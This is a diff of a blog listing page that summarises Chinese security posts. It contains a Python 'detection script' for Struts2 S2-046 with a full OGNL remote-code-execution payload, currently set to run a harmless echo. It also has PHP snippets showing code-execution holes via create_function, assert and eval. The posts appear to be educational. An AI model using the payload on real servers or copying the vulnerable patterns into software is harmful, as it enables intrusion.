@@ -90,11 +90,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2017-04-16</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -120,8 +121,8 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        Struts2 046  前段时间写的struts2 046检测脚本，代码如下：
-#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,'http://127.0.0.1:1080') return c def check(curl, url): head = [ 'Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150' ] data = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&quot;foo&quot;; filename=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dd996b71024fa97cd015f06a7f24ed30').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n''' buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.
+        Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
+#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,'http://127.0.0.1:1080') return c def check(curl, url): head = [ 'Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150' ] data = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&quot;foo&quot;; filename=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dd996b71024fa97cd015f06a7f24ed30').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n''' buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.
     </p>
 
     
@@ -137,18 +138,19 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/code-execution-vulnerabilities-2/">代码执行漏洞2</a></h2>
+        <h2><a href="http://wyb0.com/posts/code-execution-vulnerabilities-2/">代码执行漏洞(二)</a></h2>
 
         
         <div class="post-meta">
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-10-14</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -174,12 +176,11 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         接着上一篇：http://wyb0.com/posts/code-execution-vulnerabilities/
-0x00 函数create_function()  php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
+         接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可以创建一个匿名函数，其函数原型如下：
 string create_function ( string $args , string $code ) 其中$args是函数的参数，$code是函数的内容  若对提交的code未过滤或过滤不当则可能会导致代码执行漏洞
- 0x01 示例  示例a.php代码如下：
-&lt;?php $test = @$_GET['test']; $newfun = create_function('$a,$b', $test); $newfun('1111','2222'); ?&gt; 上述代码中$nuwfun('1111','2222')代表此时$a='1111',$b='2222',然后将其传给$test   0x02 函数assert()  这个函数和eval()的作用差不多
-&lt;?php @assert($_GET['str']); ?&gt;   
+0x01 示例 示例a.php代码如下：
+&lt;?php $test = @$_GET['test']; $newfun = create_function('$a,$b', $test); $newfun('1111','2222'); ?&gt; 上述代码中$nuwfun('1111','2222')代表此时$a='1111',$b='2222',然后将其传给$test  0x02 函数assert() 这个函数和eval()的作用差不多
+&lt;?php @assert($_GET['str']); ?&gt;  
     </p>
 
     
@@ -191,18 +192,19 @@ string create_function ( string $args , string $code ) 其中$args是函数的�
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/code-execution-vulnerabilities/">代码执行漏洞</a></h2>
+        <h2><a href="http://wyb0.com/posts/code-execution-vulnerabilities/">代码执行漏洞(一)</a></h2>
 
         
         <div class="post-meta">
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-07-25</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -228,8 +230,9 @@ string create_function ( string $args , string $code ) 其中$args是函数的�
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 代码执行  当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时， 没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。   0x01 相关函数  PHP：eval assert Python：exec asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能   0x02 phpcms中的string2array函数  这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
-array( //这个是字符串形式的数组，它并不是数组，而是字符串 'upload_maxsize' =&gt; '2048', 'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 'watermark_enable' =&gt; '1', 'watermark_minwidth' =&gt; '300', 'watermark_minheight' =&gt; '300', 'watermark_img' =&gt; '/statics/img/water/mark.png', 'watermark_pct' =&gt; '85', 'watermark_quality' =&gt; '80', 'watermark_pos' =&gt; '9', )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == '') return array(); @eval(&quot;\$array = $data;&quot;); return $array; }   0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器   0x04 漏洞分类(也是利用点)  执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)   0x05 漏洞挖掘  框架找漏洞，如ThinkPHP： inurl:index.
+        0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
+0x01 相关函数 PHP：eval assert Python：exec asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
+array( //这个是字符串形式的数组，它并不是数组，而是字符串 'upload_maxsize' =&gt; '2048', 'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 'watermark_enable' =&gt; '1', 'watermark_minwidth' =&gt; '300', 'watermark_minheight' =&gt; '300', 'watermark_img' =&gt; '/statics/img/water/mark.png', 'watermark_pct' =&gt; '85', 'watermark_quality' =&gt; '80', 'watermark_pos' =&gt; '9', )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == '') return array(); @eval(&quot;\$array = $data;&quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.
     </p>
 
     
